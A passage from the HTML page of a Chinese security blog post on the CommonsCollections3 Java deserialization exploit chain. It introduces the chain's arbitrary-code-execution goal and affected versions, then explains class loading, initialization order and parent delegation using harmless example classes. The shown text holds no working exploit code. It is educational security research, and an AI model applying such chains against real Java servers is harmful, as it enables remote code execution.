@@ -1,0 +1,1905 @@
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>CommonsCollections3 - DumKiy's blog</title>
+
+<meta name="description" content="流程图分析与复现0x00 概述CC3 不同于 CC1 与 CC6 最终调用 Runtime.getRuntime.exec 执行命令，而是调用 ClassLoader.loadClass 方法，动态加载类，达到任意代码执行的效果，相比之下灵活性更高。学习这一条链的主要目的就是掌握类的动态加载机制，结合反序列化进一...">
+<link rel="canonical" href="http://localhost:4000/java/2021/12/22/CommonsCollections3.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+
+<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
+
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->
+
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
+
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
+
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
+
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
+
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
+        }
+      }
+    });
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
+      }
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
+    }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3,h4'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
+  })();
+</script>
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
+
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
+ preserveAspectRatio="xMidYMid meet">
+<metadata>
+Created by potrace 1.14, written by Peter Selinger 2001-2017
+</metadata>
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
+l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
+1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
+-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
+6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
+10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
+-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
+-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
+684 10 1799 11 l1755 0 57 -23z"/>
+<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
+-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
+215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
+918 -31 16 -53 17 -87 3z"/>
+<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
+37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"/>
+</g>
+</svg>
+<a title="Watch And Learn
+" href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
+
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
+
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
+
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>CommonsCollections3</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2021-12-21-CommonsCollections3.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="CommonsCollections3"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=Deserialization+exploit+chain">Deserialization exploit chain</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>Dec 22, 2021</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2021-12-22T03:31:38+08:00">
+    <meta itemprop="keywords" content="Deserialization exploit chain"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><h1 id="流程图">流程图</h1>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640079148308-d59bddef-4973-4734-b1cd-17e56f0632d9.jpeg" alt="img" /></p>
+
+<h1 id="分析与复现">分析与复现</h1>
+
+<h2 id="0x00-概述">0x00 概述</h2>
+
+<p>CC3 不同于 CC1 与 CC6 最终调用 Runtime.getRuntime.exec 执行命令，而是调用 ClassLoader.loadClass 方法，动态加载类，达到任意代码执行的效果，相比之下灵活性更高。学习这一条链的主要目的就是掌握类的动态加载机制，结合反序列化进一步提高攻击的灵活性。</p>
+
+<h3 id="利用版本">利用版本</h3>
+
+<p>CommonsCollections 3.1 - 3.2.1</p>
+
+<h3 id="限制">限制</h3>
+
+<p>JDK版本：1.7 （8u71之后已修复不可利用）</p>
+
+<h2 id="0x01-前置知识">0x01 前置知识</h2>
+
+<h3 id="1-类加载机制">1. 类加载机制</h3>
+
+<p>所谓类加载，就是 JVM 虚拟机加载 .class 文件，进而能够调用里面的类。</p>
+
+<p>类加载过程可以分为三个阶段分别是加载、连接、初始化。连接中可以细分为验证、准备、解析。</p>
+
+<h4 id="11-类生命周期">1.1 类生命周期</h4>
+
+<p>类的声明周期除了类的加载外，还要加上类的使用（也就是实例化）与卸载。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639987086856-b5f1bdaa-3c43-43ce-9c99-ef04ef677838.png" alt="img" /></p>
+
+<ol>
+  <li><strong>加载</strong></li>
+</ol>
+
+<ul>
+  <li>根据路径获取二进制字节流。</li>
+  <li>将静态的的字节流转化为动态的运行时数据结构。</li>
+  <li>生成一个 Class 对象，用于提供各种访问入口。</li>
+</ul>
+
+<ol>
+  <li><strong>连接</strong></li>
+</ol>
+
+<ul>
+  <li>验证
+    <ul>
+      <li>验证 Class 是否合法，不是必要步骤，可以通过 -Xverif:none 关闭，关闭后可提高运行速度。</li>
+      <li><strong>准备</strong>为 static 成员变量分配内存空间并赋初始值。</li>
+      <li>解析</li>
+    </ul>
+  </li>
+</ul>
+
+<ol>
+  <li><strong>初始化</strong></li>
+  <li>实例化</li>
+  <li>卸载</li>
+</ol>
+
+<p>我们知道一个类中有很多函数：构造函数、成员函数、静态代码块、构造代码块等，在 Java 中，类生命周期分为上面的 7 步，类中不同的函数和代码块的调用顺序其实不尽相同。</p>
+
+<h4 id="12-类的初始化顺序">1.2 类的初始化顺序</h4>
+
+<p>类的初始化顺序如下：</p>
+
+<p>静态变量：用 static 声明，在准备阶段分配内存空间。</p>
+
+<p>静态代码块：用staitc声明，jvm加载类时执行，仅执行一次，也是在准备阶段分配内存空间。
+构造代码块：类中直接用{}定义，每一次创建对象时执行。
+执行顺序优先级：静态块,main(),构造块,构造方法。</p>
+
+<p>继承情况下的初始化顺序如下：</p>
+
+<ol>
+  <li>执行父类的静态代码块，并初始化父类静态成员变量</li>
+  <li>
+    <p>执行子类的静态代码块，并初始化子类静态成员变量</p>
+  </li>
+  <li>执行父类的构造代码块，执行父类的构造函数，并初始化父类普通成员变量</li>
+  <li>执行子类的构造代码块， 执行子类的构造函数，并初始化子类普通成员变量</li>
+</ol>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639986613677-d95ebc20-d9d1-47a4-a751-6e849ee042ce.png" alt="img" /></p>
+
+<p>我们可以手动编写代码测试一下：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Person</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="nf">Person</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用构造函数"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用构造代码块"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用静态代码块"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="n">结果</span><span class="err">：</span>
+<span class="n">调用静态代码块</span>
+</code></pre></div></div>
+
+<p>此时仅仅只是加载了类并且执行了 main 方法，并没有进行实例化，因此不会调用构造代码块和构造函数。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Person</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="nf">Person</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用构造函数"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用构造代码块"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用静态代码块"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">Person</span> <span class="n">person</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Person</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="n">结果</span><span class="err">：</span>
+<span class="n">调用静态代码块</span>
+<span class="n">调用构造代码块</span>
+<span class="n">调用构造函数</span>
+</code></pre></div></div>
+
+<p>可以看到构造代码块是优先与构造函数执行的。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Person</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="nf">Person</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用构造函数"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用构造代码块"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用静态代码块"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">Person</span> <span class="n">person</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Person</span><span class="o">();</span>
+        <span class="nc">Person</span> <span class="n">person2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Person</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="n">结果</span><span class="err">：</span>
+<span class="n">调用静态代码块</span>
+<span class="n">调用构造代码块</span>
+<span class="n">调用构造函数</span>
+<span class="n">调用构造代码块</span>
+<span class="n">调用构造函数</span>
+</code></pre></div></div>
+
+<p>由此可知，静态代码块只在类被加载的时候调用一次，后续的实例化并没有再次调用。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Person</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="nc">String</span> <span class="n">string</span> <span class="o">=</span> <span class="s">"静态成员变量"</span><span class="o">;</span>
+    <span class="nc">String</span> <span class="n">string2</span> <span class="o">=</span> <span class="s">"成员变量"</span><span class="o">;</span>
+    
+    <span class="kd">public</span> <span class="nf">Person</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用构造函数"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用构造代码块"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">string</span><span class="o">);</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用静态代码块"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">Person</span> <span class="n">person</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Person</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+<span class="n">结果</span><span class="err">：</span>
+<span class="n">静态成员变量</span>
+<span class="n">调用静态代码块</span>
+<span class="n">调用构造代码块</span>
+<span class="n">调用构造函数</span>
+</code></pre></div></div>
+
+<p>可以看到静态成员变量在静态代码块前就初始化了。</p>
+
+<p>下面编写一个继承关系</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Person</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="nc">String</span> <span class="n">string</span> <span class="o">=</span> <span class="s">"静态成员变量"</span><span class="o">;</span>
+    <span class="nc">String</span> <span class="n">string2</span> <span class="o">=</span> <span class="s">"成员变量"</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nf">Person</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用构造函数"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用构造代码块"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">string</span><span class="o">);</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"调用静态代码块"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">Person</span> <span class="n">person</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Person2</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="kd">class</span> <span class="nc">Person2</span> <span class="kd">extends</span> <span class="nc">Person</span><span class="o">{</span>
+
+    <span class="kd">public</span> <span class="nf">Person2</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"子类调用构造函数"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"子类调用构造代码块"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">string</span><span class="o">);</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"子类调用静态代码块"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+<span class="n">结果</span><span class="err">：</span>
+<span class="n">静态成员变量</span>
+<span class="n">调用静态代码块</span>
+<span class="n">静态成员变量</span>
+<span class="n">子类调用静态代码块</span>
+<span class="n">调用构造代码块</span>
+<span class="n">调用构造函数</span>
+<span class="n">子类调用构造代码块</span>
+<span class="n">子类调用构造函数</span>
+</code></pre></div></div>
+
+<p>静态成员变量与静态代码块在类加载的时候就初始化了，并且父类的静态变量与静态方法是优先于子类的。构造函数与构造代码块的顺序不变，也是先父类再子类。</p>
+
+<h4 id="13-双亲委派模型parents-delegate">1.3 双亲委派模型（parents delegate）</h4>
+
+<p>Java 程序的所有类，都是使用 java.lang.ClassLoader 的一些子类加载。Java 本身提供了 3 种类加载器，这三种类加载器分别是：</p>
+
+<ol>
+  <li>启动类加载器(Bootstrap ClassLoader)，C++实现，主要负责加载<JAVA_HOME>\lib目录中或被-Xbootclasspath指定的路径中的并且文件名是被虚拟机识别的文件。</JAVA_HOME></li>
+  <li>
+    <p>扩展类加载器(Extension ClassLoader)，Java 实现，主要负责加载<JAVA_HOME>\lib\ext目录中或被java.ext.dirs系统变量所指定的路径的类库。</JAVA_HOME></p>
+  </li>
+  <li>应用程序类加载器(Application ClassLoader)，Java 实现，主要负责加载用户类路径(classPath)上的类库，<strong>如果没有实现自定义的类加载器，那么这个加载器就是运行时默认的加载器。</strong></li>
+</ol>
+
+<p>双亲委派模型英文为 parents delegate ，具体结构如下图：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640001547594-a103dfee-b550-4ae8-a64f-b2c0c93d68f7.webp" alt="img" /></p>
+
+<p>在没有自定义 ClassLoader 时，默认使用 Application ClassLoader 加载用户自己写的类， Application ClassLoader 在加载某个类时，会向上询问 Extension ClassLoader 是否已经将该类加载过， Extension ClassLoader 也会向 Bootstrap ClassLoader 询问。</p>
+
+<p>因此三种加载器在逻辑上是继承关系，但实际上在 Java 具体实现中三种 ClassLoader 时，关系如下图所示：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640001957207-ec0338bf-f27c-456c-9a37-e51193c0cf69.jpeg" alt="img" /></p>
+
+<p>此前反射中用到的 Class.forName 就是一种类加载的方式。</p>
+
+<p>比如如下的写法：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ClassNotFoundException</span> <span class="o">{</span>
+        <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"Person"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>调试跟进 forName，可以发现其内部调用了 forName0 方法。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639990102545-f5f82484-1807-4522-8aeb-24a5a575d5a0.png" alt="img" /></p>
+
+<p>可以看到 forName0 是一个 native 方法。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639990203735-a6130824-4133-4681-bd1d-726b2a0ffcc2.png" alt="img" /></p>
+
+<p>实际上 Class.forName0 底层调用的也是 ClassLoader 进行加载。</p>
+
+<p>我们可以从代码层入手更加深刻地理解 Java 是如何实现类加载的。</p>
+
+<p>Test.java</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ClassNotFoundException</span> <span class="o">{</span>
+        <span class="nc">ClassLoader</span> <span class="n">cl</span> <span class="o">=</span> <span class="nc">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">();</span>
+        <span class="n">cl</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"Person"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>getSystemClassLoader 函数用于获取系统的 ClassLoader。</li>
+  <li>loadClass 加载指定的类。</li>
+</ul>
+
+<p>下断点后开始调试。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639990426529-22c704ca-b5cf-4846-b63a-530a888c1692.png" alt="img" /></p>
+
